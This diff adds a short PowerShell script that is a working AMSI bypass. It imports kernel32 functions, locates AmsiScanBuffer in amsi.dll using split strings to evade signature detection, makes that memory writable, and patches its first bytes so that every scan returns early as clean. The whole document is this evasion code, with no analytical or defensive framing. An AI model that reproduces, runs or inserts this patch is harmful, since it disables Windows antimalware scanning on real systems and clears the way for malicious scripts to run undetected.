@@ -1,0 +1,14 @@
+$a = '[DllImport("kernel32")]public static extern'
+$b = @" 
+$a IntPtr GetProcAddress(IntPtr hModule, string procName);
+$a IntPtr LoadLibrary(string name);
+$a bool VirtualProtect(IntPtr lpAddress, UIntPtr lnsgbs, uint flNewProtect, out uint lpflOldProtect);
+"@
+
+Add-Type -name y -names x $b
+$c=0
+$d=[x.y]::LoadLibrary('amsi.dll')
+$e=[x.y]::GetProcAddress($d, ('Ams'+'iScanBuffer'))
+[x.y]::VirtualProtect($e, [uint32]5, 0x40, [ref]$c) 
+$f=[byte[]](184,87,0,7,128,195) 
+[System.Runtime.InteropServices.Marshal]::('Co'+'py')($f, 0, $e, 6)
